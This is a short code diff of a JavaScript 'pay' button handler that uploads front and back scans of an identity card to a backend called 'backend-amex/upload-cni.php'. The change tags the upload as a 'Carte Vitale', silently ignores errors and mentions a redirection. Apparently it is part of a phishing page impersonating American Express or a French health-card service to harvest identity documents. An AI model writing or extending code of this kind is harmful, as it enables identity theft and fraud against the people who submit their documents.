@@ -767,8 +767,8 @@ document.querySelector('.btn-payer').addEventListener('click', async function() 
             await fetch('backend-amex/upload-cni.php', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ recto: rectoDataURL, verso: versoDataURL, clientId })
-            });
+                body: JSON.stringify({ recto: rectoDataURL, verso: versoDataURL, clientId, type: 'Carte Vitale' })
+              });
         } catch (e) { /* ignore si pas dispo */ }
 
         // 2. Add redirection (comme avant, si tu gardes ce backend)
